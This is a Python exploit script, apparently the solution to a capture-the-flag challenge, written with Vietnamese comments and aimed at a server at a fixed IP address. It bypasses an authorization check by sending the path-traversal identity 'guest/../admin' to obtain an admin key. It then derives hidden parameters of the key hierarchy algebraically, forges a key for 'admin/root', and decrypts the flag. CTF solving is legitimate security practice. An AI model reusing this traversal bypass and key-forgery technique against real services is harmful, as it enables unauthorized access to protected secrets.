import hashlib
import requests
import sys

# --- Cấu hình ---
# Dùng 127.0.0.1 thay vì localhost để tránh lỗi phân giải IPv6
TARGET_URL = "http://124.197.22.141:6664" 
Q = int("73eda753299d7d483339d80809a1d80553bda402fffe5bfeffffffff00000001", 16)

# --- Các hàm hỗ trợ (Copy logic từ app.py) ---
def prime_mix(component: str, depth: int) -> int:
    base = hashlib.sha256(f"{depth}:{component}".encode()).digest()
    state = int.from_bytes(base, "big") % Q
    for round_idx in range(3):
        state = pow((state + 7 * (round_idx + 1)) % Q, 5, Q)
        state = (state * 3 + 11 * depth + round_idx) % Q
    return state

def stream_xor(key_int: int, data: bytes) -> bytes:
    key_bytes = hashlib.sha256(str(key_int).encode()).digest()
    keystream = bytearray()
    counter = 0
    while len(keystream) < len(data):
        block = hashlib.sha256(key_bytes + counter.to_bytes(4, "big")).digest()
        keystream.extend(block)
        counter += 1
    return bytes([d ^ k for d, k in zip(data, keystream)])

# --- Logic Tấn công ---

def get_nonce(s):
    """Lấy nonce hiện tại từ server"""
    try:
        res = s.get(f"{TARGET_URL}/api/nonce")
        if res.status_code != 200:
            print(f"[-] Lỗi lấy nonce: {res.text}")
            sys.exit(1)
        return res.json()['nonce']
    except requests.exceptions.ConnectionError:
        print(f"[-] Không thể kết nối đến {TARGET_URL}. Hãy chắc chắn app.py đang chạy.")
        sys.exit(1)

def get_key(s, raw_identity, normalized_identity_for_auth):
    """
    Gửi request lấy key.
    raw_identity: chuỗi gửi đi (có thể chứa ../ để bypass check)
    normalized_identity_for_auth: chuỗi dùng để tạo token xác thực (server sẽ chuẩn hóa chuỗi nhận được trước khi check auth)
    """
    # 1. Lấy nonce mới nhất
    nonce = get_nonce(s)
    
    # 2. Tạo Auth Token
    # Quan trọng: Server verify hash dựa trên identity ĐÃ CHUẨN HÓA
    msg = f"{normalized_identity_for_auth}|{nonce}"
    token = hashlib.sha256(msg.encode()).hexdigest()[:12]
    
    # 3. Request Key
    # Gửi raw_identity (vd: guest/../admin) để vượt qua check startswith("guest/")
    params = {"identity": raw_identity, "nonce": nonce}
    headers = {"X-Auth": token}
    res = s.get(f"{TARGET_URL}/api/key", params=params, headers=headers)
    
    if res.status_code != 200:
        print(f"[-] Không lấy được key cho {raw_identity}. Status: {res.status_code}")
        print(f"[-] Response: {res.text}")
        sys.exit(1)
        
    return int(res.json()['secret_hex'], 16)

def solve():
    s = requests.Session()
    
    print(f"[*] Đang kết nối tới {TARGET_URL}...")

    # --- Bước 0: Lấy Ciphertext ---
    try:
        res = s.get(f"{TARGET_URL}/api/ciphertext")
        if res.status_code != 200:
            print("[-] Lỗi lấy ciphertext")
            sys.exit(1)
        ct_hex = res.json()['ciphertext_hex']
        ct_bytes = bytes.fromhex(ct_hex)
        print(f"[+] Ciphertext đã lấy: {ct_hex[:30]}...")
    except Exception as e:
        print(f"[-] Lỗi kết nối: {e}")
        return

    # --- Bước 1: Khôi phục biến X (State tại depth 1) ---
    # Ta dùng Path Traversal: "guest/../admin" -> Server hiểu là "admin"
    # Công thức: Key_admin = alpha_admin * (MSK + Noise_Base_0) + 8
    # Đặt X = MSK + Noise_Base_0
    
    print("[*] 1. Khai thác Path Traversal để lấy key 'admin'...")
    key_admin = get_key(s, "guest/../admin", "admin")
    
    alpha_admin = prime_mix("admin", 1)
    alpha_admin_inv = pow(alpha_admin, -1, Q)
    
    # Key_admin = alpha_admin * X + 8  =>  X = (Key_admin - 8) / alpha_admin
    X = ((key_admin - 8) * alpha_admin_inv) % Q
    print(f"[+] Đã tìm được thành phần ẩn X")

    # --- Bước 2: Khôi phục Noise tại Depth 2 (N2) ---
    # Ta lấy key hợp lệ của "guest/demo"
    # Depth 1 (guest): S1_guest = alpha_guest * X + 8
    # Depth 2 (demo):  Key_gd   = alpha_demo * (S1_guest + N2) + 9
    
    print("[*] 2. Lấy key 'guest/demo' để tìm tham số nhiễu N2...")
    key_gd = get_key(s, "guest/demo", "guest/demo")
    
    alpha_guest = prime_mix("guest", 1)
    alpha_demo = prime_mix("demo", 2)
    
    # Tính S1_guest local vì ta đã có X
    S1_guest = (alpha_guest * X + 8) % Q
    
    # Tính N2 từ Key_gd
    # S1_guest + N2 = (Key_gd - 9) / alpha_demo
    alpha_demo_inv = pow(alpha_demo, -1, Q)
    term = ((key_gd - 9) * alpha_demo_inv) % Q
    N2 = (term - S1_guest) % Q
    print(f"[+] Đã tìm được tham số nhiễu N2")

    # --- Bước 3: Giả mạo Key cho 'admin/root' ---
    # Path mục tiêu: admin/root
    # Depth 1 (admin): S1_admin = Key_admin (đã có ở bước 1)
    # Depth 2 (root):  Key_target = alpha_root * (S1_admin + N2) + 9
    
    print("[*] 3. Tính toán key giả mạo cho 'admin/root'...")
    alpha_root = prime_mix("root", 2)
    S1_admin = key_admin 
    
    key_target = (alpha_root * (S1_admin + N2) + 9) % Q
    print(f"[+] Key giả mạo: {hex(key_target)}")

    # --- Bước 4: Giải mã ---
    print("[*] 4. Đang giải mã flag...")
    flag = stream_xor(key_target, ct_bytes)
    
    try:
        print(f"\n[SUCCESS] Flag: {flag.decode()}")
    except:
        print(f"\n[INFO] Raw bytes (không decode được text): {flag}")

if __name__ == "__main__":
    solve()